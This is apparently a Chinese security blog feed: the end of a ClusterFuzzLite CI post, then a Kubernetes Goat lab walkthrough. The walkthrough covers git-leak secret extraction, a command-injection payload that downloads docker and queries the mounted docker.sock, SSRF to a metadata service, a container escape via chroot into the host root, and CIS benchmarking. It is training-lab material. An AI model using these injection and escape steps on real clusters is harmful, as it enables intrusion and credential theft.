class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">name: ClusterFuzzLite cron tasks</span><br><span class="line">on:</span><br><span class="line">  schedule:</span><br><span class="line">    - cron: &apos;0 0 * * *&apos;  # Once a day at midnight.</span><br><span class="line">permissions: read-all</span><br><span class="line">jobs:</span><br><span class="line">  Pruning:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">    - name: Build Fuzzers</span><br><span class="line">      id: build</span><br><span class="line">      uses: google/clusterfuzzlite/actions/build_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        language: c++ # Change this to the language you are fuzzing</span><br><span class="line">    - name: Run Fuzzers</span><br><span class="line">      id: run</span><br><span class="line">      uses: google/clusterfuzzlite/actions/run_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        fuzz-seconds: 600</span><br><span class="line">        mode: &apos;prune&apos;</span><br><span class="line">        # Optional but recommended.</span><br><span class="line">        # See later section on &quot;Git repo for storage&quot;.</span><br><span class="line">        # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git</span><br><span class="line">        # storage-repo-branch: main   # Optional. Defaults to &quot;main&quot;</span><br><span class="line">        # storage-repo-branch-coverage: gh-pages  # Optional. Defaults to &quot;gh-pages&quot;.</span><br><span class="line">  Coverage:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    steps:</span><br><span class="line">    - name: Build Fuzzers</span><br><span class="line">      id: build</span><br><span class="line">      uses: google/clusterfuzzlite/actions/build_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        language: c++ # Change this to the language you are fuzzing.</span><br><span class="line">        sanitizer: coverage</span><br><span class="line">    - name: Run Fuzzers</span><br><span class="line">      id: run</span><br><span class="line">      uses: google/clusterfuzzlite/actions/run_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        fuzz-seconds: 600</span><br><span class="line">        mode: &apos;coverage&apos;</span><br><span class="line">        sanitizer: &apos;coverage&apos;</span><br><span class="line">        # Optional but recommended.</span><br><span class="line">        # See later section on &quot;Git repo for storage&quot;.</span><br><span class="line">        # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git</span><br><span class="line">        # storage-repo-branch: main   # Optional. Defaults to &quot;main&quot;</span><br><span class="line">        # storage-repo-branch-coverage: gh-pages  # Optional. Defaults to &quot;gh-pages&quot;.</span><br></pre></td></tr></table></figure><p>之后将代码都提交github，之后在Actions那里可以看到Workflow</p><p><img src="http://pic.giantbranch.cn/pic/1687249996481.png" alt></p><p>此外谷歌官方人员也有个curl示例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/oliverchang/curl/</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://google.github.io/clusterfuzzlite/" target="_blank" rel="noopener">https://google.github.io/clusterfuzzlite/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;clusterfuzzlite是是一种持续的模糊测试解决方案，作为持续集成 (CI) 工作流的一部分运行，比如我们一旦push代码，便可以自动build，之后自动fuzz。&lt;/p&gt;
&lt;p&gt;比如它支持GitHub Actions，GitLab，Google Cloud Bui
      
    
    </summary>
    
    
      <category term="clusterfuzzlite" scheme="https://www.giantbranch.cn/tags/clusterfuzzlite/"/>
    
      <category term="ci-fuzz" scheme="https://www.giantbranch.cn/tags/ci-fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes Goat：Kubernetes 漏洞靶场</title>
    <link href="https://www.giantbranch.cn/2022/06/13/Kubernetes%20Goat%EF%BC%9AKubernetes%20%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
    <id>https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/</id>
    <published>2022-06-13T00:00:00.000Z</published>
    <updated>2023-10-13T13:38:33.762Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码中的敏感keys-Sensitive-keys-in-codebases"><a href="#代码中的敏感keys-Sensitive-keys-in-codebases" class="headerlink" title="代码中的敏感keys(Sensitive keys in codebases)"></a>代码中的敏感keys(Sensitive keys in codebases)</h1><p>网站文字写着（翻译后如下）：</p><p>欢迎使用构建代码服务。 该服务是使用具有 CI/CD 管道和现代工具集（如 Git、Docker、AWS 等）的容器构建的。</p><p><img src="http://pic.giantbranch.cn/pic/1655867696983.png" alt></p><p>给的是一个web，就是代码泄露，里面包含了Sensitive keys</p><p>可以通过目录爆破工具dirsearch进行目录爆破，确认是git泄露，再用相应工具泄露</p><p><img src="http://pic.giantbranch.cn/pic/1655360710352.png" alt></p><p>通过git-dumper下载源码</p><p><img src="http://pic.giantbranch.cn/pic/1655361505563.png" alt></p><p>有一个提交，环境变量比较敏感</p><p><img src="http://pic.giantbranch.cn/pic/1655361567304.png" alt></p><p>切换过去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class="line">Note: checking out &apos;d7c173ad183c574109cd5c4c648ffe551755b576&apos;.</span><br><span class="line"></span><br><span class="line">You are in &apos;detached HEAD&apos; state. You can look around, make experimental</span><br><span class="line">changes and commit them, and you can discard any commits you make in this</span><br><span class="line">state without impacting any branches by performing another checkout.</span><br><span class="line"></span><br><span class="line">If you want to create a new branch to retain commits you create, you may</span><br><span class="line">do so (now or later) by using -b with the checkout command again. Example:</span><br><span class="line"></span><br><span class="line">  git checkout -b &lt;new-branch-name&gt;</span><br><span class="line"></span><br><span class="line">HEAD is now at d7c173a... Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure><p>跟原来比，多了一个隐藏文件.env，一看是aws的一些key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls -a</span><br><span class="line">.  ..  .env  .git  go.mod  go.sum  main.go  README.md</span><br><span class="line">$ cat .env</span><br><span class="line">[build-code-aws]</span><br><span class="line">aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br></pre></td></tr></table></figure><p>进入pod中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)</span><br><span class="line">kubectl exec -it $POD_NAME -- sh</span><br></pre></td></tr></table></figure><p>执行<code>trufflehog .</code>来分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/app # trufflehog .</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">Reason: High Entropy</span><br><span class="line">Date: 2020-11-06 22:39:53</span><br><span class="line">Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Filepath: .env</span><br><span class="line">Branch: origin/master</span><br><span class="line">Commit: updated the endpoints and routes</span><br><span class="line"></span><br><span class="line">@@ -0,0 +1,5 @@</span><br><span class="line">+[build-code-aws]</span><br><span class="line">+aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class="line">+aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class="line">+k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br><span class="line">+</span><br><span class="line"></span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">Reason: High Entropy</span><br><span class="line">Date: 2020-11-06 22:39:53</span><br><span class="line">Hash: 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class="line">Filepath: go.sum</span><br><span class="line">Branch: origin/master</span><br><span class="line">Commit: updated the endpoints and routes</span><br><span class="line"></span><br><span class="line">@@ -1,496 +1,25 @@</span><br><span class="line">-cloud.google.com/go v0.26.0/go.mod h1:aQUYkXzVsufM+DwF1aE+0xfcU+56JwCaLick0ClmMTw=</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这个工具可通过pip安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install trufflehog</span><br></pre></td></tr></table></figure><h1 id="DIND-docker-in-docker-exploitation"><a href="#DIND-docker-in-docker-exploitation" class="headerlink" title="DIND (docker-in-docker) exploitation"></a>DIND (docker-in-docker) exploitation</h1><p>这个就是命令注入，之后看到把docker.sock映射到里面了</p><p>/var/run/docker.sock是Docker守护进程(Docker daemon)默认监听的Unix域套接字(Unix domain socket)，假如被映射到容器内，那么我们就可以跟Docker daemon进行通信，从而执行一些命令</p><p><img src="http://pic.giantbranch.cn/pic/1655365740259.png" alt></p><p>可以通过下载docker静态二进制文件进行利用，下面是查看主机上面有什么镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.9.tgz -O /tmp/docker-19.03.9.tgz &amp;&amp; tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/ ;/tmp/docker/docker -H unix:///custom/docker/docker.sock images</span><br></pre></td></tr></table></figure><p>假如利用的话就是拉取指定的后门镜像并运行，运行过程中镜像将宿主机的根目录/挂载到容器内部的/host目录下，便于通过后门容器修改宿主机本地文件(如crontab)来完成逃逸。</p><p>在配置文件中也能看到目录映射</p><p><img src="http://pic.giantbranch.cn/pic/1655372968803.png" alt></p><h1 id="Kubernetes-K8S-中的-SSRF"><a href="#Kubernetes-K8S-中的-SSRF" class="headerlink" title="Kubernetes (K8S) 中的 SSRF"></a>Kubernetes (K8S) 中的 SSRF</h1><p>这是一个内部API代理，5000端口</p><p><img src="http://pic.giantbranch.cn/pic/1655368452535.png" alt></p><p>看到有个metadata-db的东东</p><p><img src="http://pic.giantbranch.cn/pic/1655368614907.png" alt></p><p>不断深入，发现<code>http://metadata-db/latest/secrets/kubernetes-goat</code></p><p><img src="http://pic.giantbranch.cn/pic/1655368646137.png" alt></p><p>解码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=&quot; | base64 -d</span><br><span class="line">k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab</span><br></pre></td></tr></table></figure><h1 id="容器逃逸-Container-escape-to-the-host-system"><a href="#容器逃逸-Container-escape-to-the-host-system" class="headerlink" title="容器逃逸(Container escape to the host system)"></a>容器逃逸(Container escape to the host system)</h1><p>为了适应更复杂的权限需求，从 2.2 版本起 Linux 内核能够进一步将超级用户的权限分解为细颗粒度的单元，这些单元称为 capabilities。例如，capability CAP_CHOWN 允许用户对文件的 UID 和 GID 进行任意修改，即执行 chown 命令。几乎所有与超级用户相关的特权都被分解成了单独的 capability。</p><p>在docker中可以使用<code>capsh --print</code>输出各种capability权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/# capsh --print</span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep</span><br><span class="line">Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span><br><span class="line">Securebits: 00/0x0/1&apos;b0</span><br><span class="line"> secure-noroot: no (unlocked)</span><br><span class="line"> secure-no-suid-fixup: no (unlocked)</span><br><span class="line"> secure-keep-caps: no (unlocked)</span><br><span class="line">uid=0(root)</span><br><span class="line">gid=0(root)</span><br><span class="line">groups=</span><br></pre></td></tr></table></figure><p>通过跟正常的机器输出的权限进行对比，基本没什么差别，这是具有所有权限的root</p><p>通过mount命令可以看到挂载了一个/host-system目录</p><p><img src="http://pic.giantbranch.cn/pic/1655710371323.png" alt></p><p>通过df命令也可以看到，只不过我们不确定这是不是挂载的</p><p><img src="http://pic.giantbranch.cn/pic/1655710526301.png" alt></p><p>看名字应该是宿主机目录的，我们ls一下，这看着是整个宿主机的根目录都映射进来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:~# ls /host-system/</span><br><span class="line">bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var</span><br><span class="line">root@nsfocus:~#</span><br></pre></td></tr></table></figure><p>通过chroot命令，我们可以获取宿主机的执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:~# chroot /host-system/ bash</span><br><span class="line">root@nsfocus:/# ls</span><br><span class="line">bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swap.img  sys  tmp  usr  var</span><br><span class="line">root@nsfocus:/# docker ps</span><br><span class="line">CONTAINER ID   IMAGE                                                 COMMAND                  CREATED      STATUS      PORTS     NAMES</span><br><span class="line">f0a9afd6f2b6   madhuakula/k8s-goat-info-app                          &quot;python /app.py&quot;         3 days ago   Up 3 days             k8s_info-app_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">628fcee2fd49   madhuakula/k8s-goat-internal-api                      &quot;docker-entrypoint.s…&quot;   4 days ago   Up 4 days             k8s_internal-api_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">df0495417aa4   registry.aliyuncs.com/google_containers/pause:3.4.1   &quot;/pause&quot;                 4 days ago   Up 4 days             k8s_POD_internal-proxy-deployment-5d99cbbdf7-wqmgr_default_efb4eb97-4aa0-4da2-9a93-a0a5dc762649_0</span><br><span class="line">5702cc4cdd60   madhuakula/k8s-goat-system-monitor                    &quot;gotty -w bash&quot;          4 days ago   Up 4 days             k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_0</span><br><span class="line">9c1ca7ec8f1a   madhuakula/k8s-goat-poor-registry                     &quot;/entrypoint.sh regi…&quot;   4 days ago   Up 4 days             k8s_poor-registry_poor-registry-deployment-6746b95974-j9xrw_default_d4820b3b-48f0-4ebb-9657-c24d677c73cb_0</span><br><span class="line">c8993f38a99d   madhuakula/k8s-goat-home                              &quot;/docker-entrypoint.…&quot;   4 days ago   Up 4 days             k8s_kubernetes-goat-home_kubernetes-goat-home-deployment-757f96b7cd-tq5zh_default_ef99f1cd-b0ff-4d6a-9a2e-6443acba79ee_0</span><br><span class="line">4a7f97587378   madhuakula/k8s-goat-hidden-in-layers                  &quot;sh -c &apos;tail -f /dev…&quot;   4 days ago   Up 4 days             k8s_hidden-in-layers_hidden-in-layers-lbwbn_default_2ab7372a-e434-4cae-8ede-beca97d662ab_0</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>还可以通过kubectl控制，查看集群（这里需要指定配置文件）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d4h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d4h</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d4h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d4h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          3d23h</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d4h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d4h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d4h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d4h</span><br><span class="line">root@nsfocus:/# kubectl --kubeconfig /etc/kubernetes/kubelet.conf get nodes</span><br><span class="line">NAME         STATUS   ROLES                  AGE     VERSION</span><br><span class="line">k8s-master   Ready    control-plane,master   4d20h   v1.21.13</span><br><span class="line">nsfocus      Ready    &lt;none&gt;                 4d20h   v1.21.13</span><br></pre></td></tr></table></figure><p>我们查看一下部署的yaml文件，可以看到除了挂载根目录到/host-system，securityContext那里还有allowPrivilegeEscalation: true和privileged: true，这两个可是很危险的，跟docker的–privileged</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat/scenarios/system-monitor# cat deployment.yaml </span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  name: goatvault</span><br><span class="line">type: Opaque</span><br><span class="line">data:</span><br><span class="line">  k8sgoatvaultkey: azhzLWdvYXQtY2QyZGEyNzIyNDU5MWRhMmI0OGVmODM4MjZhOGE2YzM=</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">volumes:</span><br><span class="line">      - name: host-filesystem</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br><span class="line">      containers:</span><br><span class="line">      - name: system-monitor</span><br><span class="line">        image: madhuakula/k8s-goat-system-monitor</span><br><span class="line">        resources:</span><br><span class="line">          limits:</span><br><span class="line">            memory: &quot;50Mi&quot;</span><br><span class="line">            cpu: &quot;20m&quot;</span><br><span class="line">        securityContext:</span><br><span class="line">          allowPrivilegeEscalation: true</span><br><span class="line">          privileged: true</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: host-filesystem</span><br><span class="line">          mountPath: /host-system</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h1 id="Docker-CIS-基准分析"><a href="#Docker-CIS-基准分析" class="headerlink" title="Docker CIS 基准分析"></a>Docker CIS 基准分析</h1><p>CIS即Center for Internet Security (CIS) 为安全基准计划提供了定义明确、公正、基于一致性的行业最佳实践来帮助组织评估和增强其安全性</p><p>Docker Bench for Security是一款脚本工具，用于检查围绕在生产环境中部署Docker容器的数十种常见最佳实践。github地址：<a href="https://github.com/docker/docker-bench-security" target="_blank" rel="noopener">https://github.com/docker/docker-bench-security</a></p><p>首先部署 Docker CIS 基准测试的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/docker-bench-security/deployment.yaml</span><br></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it docker-bench-security-XXXXX -- sh</span><br></pre></td></tr></table></figure><p>执行<code>~/docker-bench-security</code>中的docker-bench-security.sh即可执行检查</p><p>其实上面的<code>scenarios/docker-bench-security/deployment.yaml</code>是将一些宿主机目录映射到容器中，从而执行的检查。</p><p>所以我们也可以直接从github下载脚本到宿主机进行检查</p><h1 id="Kubernetes-CIS-基准分析"><a href="#Kubernetes-CIS-基准分析" class="headerlink" title="Kubernetes CIS 基准分析"></a>Kubernetes CIS 基准分析</h1><p>上面是docker，这次是Kubernetes，github地址：<a href="https://github.com/aquasecurity/kube-bench" target="_blank" rel="noopener">https://github.com/aquasecurity/kube-bench</a></p><p>两个命令部署即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line"></span><br><span class="line">kubectl apply -f scenarios/kube-bench-security/master-job.yaml</span><br></pre></td></tr></table></figure><p>查看yaml，两个执行的命令分别是<code>command: [&quot;kube-bench&quot;, &quot;node&quot;]</code>和<code>command: [&quot;kube-bench&quot;, &quot;master&quot;]</code></p><p>不过我看github上的yaml的command已经有所改变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/aquasecurity/kube-bench/blob/main/job-master.yaml</span><br><span class="line">command: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;master&quot;]</span><br><span class="line"># https://github.com/aquasecurity/kube-bench/blob/main/job-node.yaml</span><br><span class="line">command: [&quot;kube-bench&quot;, &quot;run&quot;, &quot;--targets&quot;, &quot;node&quot;]</span><br></pre></td></tr></table></figure><p>执行后可以看到jobs多了一个<code>kube-bench-node</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class="line">job.batch/kube-bench-node created</span><br><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get jobs</span><br><span class="line">NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-check-job    1/1           36s        4d6h</span><br><span class="line">hidden-in-layers   0/1           4d6h       4d6h</span><br><span class="line">kube-bench-node    0/1           14s        14s</span><br></pre></td></tr></table></figure><p>不过通过查看pod的状态是Error</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@k8s-master:~/kubernetes-goat# kubectl get pods</span><br><span class="line">NAME                                               READY   STATUS      RESTARTS   AGE</span><br><span class="line">batch-check-job-mrd2q                              0/1     Completed   0          4d6h</span><br><span class="line">build-code-deployment-99d5f65db-hxllz              1/1     Running     0          4d6h</span><br><span class="line">docker-bench-security-dvlgz                        1/1     Running     0          61m</span><br><span class="line">health-check-deployment-66c59d7f6f-qf5b7           1/1     Running     0          4d6h</span><br><span class="line">hidden-in-layers-lbwbn                             1/1     Running     0          4d6h</span><br><span class="line">internal-proxy-deployment-5d99cbbdf7-wqmgr         2/2     Running     0          4d1h</span><br><span class="line">kube-bench-node-44mxv                              0/1     Error       0          12m</span><br><span class="line">kube-bench-node-8vf74                              0/1     Error       0          10m</span><br><span class="line">kube-bench-node-lfnmt                              0/1     Error       0          8m10s</span><br><span class="line">kube-bench-node-nmfn8                              0/1     Error       0          10m</span><br><span class="line">kube-bench-node-t67b8                              0/1     Error       0          11m</span><br><span class="line">kube-bench-node-xnlvw                              0/1     Error       0          5m30s</span><br><span class="line">kube-bench-node-zb54v                              0/1     Error       0          9m30s</span><br><span class="line">kubernetes-goat-home-deployment-757f96b7cd-tq5zh   1/1     Running     0          4d6h</span><br><span class="line">metadata-db-77987b74b-2tqjr                        1/1     Running     0          4d6h</span><br><span class="line">poor-registry-deployment-6746b95974-j9xrw          1/1     Running     0          4d6h</span><br><span class="line">system-monitor-deployment-594c89b48f-97rs9         1/1     Running     0          4d6h</span><br></pre></td></tr></table></figure><p>后面修改command后再试</p><figure class="highlight 